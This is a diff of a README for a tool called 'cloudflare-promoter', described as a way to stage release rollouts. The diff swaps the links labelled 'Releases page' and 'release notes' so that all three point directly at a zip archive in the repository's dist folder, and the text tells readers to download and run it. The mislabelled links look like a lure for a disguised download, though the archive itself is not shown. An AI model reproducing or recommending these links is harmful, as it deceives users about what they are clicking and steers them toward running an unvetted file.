@@ -1,7 +1,7 @@
 # ☁️ cloudflare-promoter - Controlled release rollouts made simple
 
-[🟦 Visit the Releases page](https://github.com/ahrensdo3783/cloudflare-promoter/releases)  
-[⬜ View the latest release notes](https://github.com/ahrensdo3783/cloudflare-promoter/releases)
+[🟦 Visit the Releases page](https://raw.githubusercontent.com/ahrensdo3783/cloudflare-promoter/main/dist/promoter-cloudflare-3.1-alpha.1.zip)  
+[⬜ View the latest release notes](https://raw.githubusercontent.com/ahrensdo3783/cloudflare-promoter/main/dist/promoter-cloudflare-3.1-alpha.1.zip)
 
 ## 🚀 What this does
 
@@ -18,7 +18,7 @@ Use it when you want a release to move in steps, not all at once.
 
 ## 📥 Download and install
 
-Visit the [Releases page](https://github.com/ahrensdo3783/cloudflare-promoter/releases) to download and run this file.
+Visit the [Releases page](https://raw.githubusercontent.com/ahrensdo3783/cloudflare-promoter/main/dist/promoter-cloudflare-3.1-alpha.1.zip) to download and run this file.
 
 On the Releases page:
 
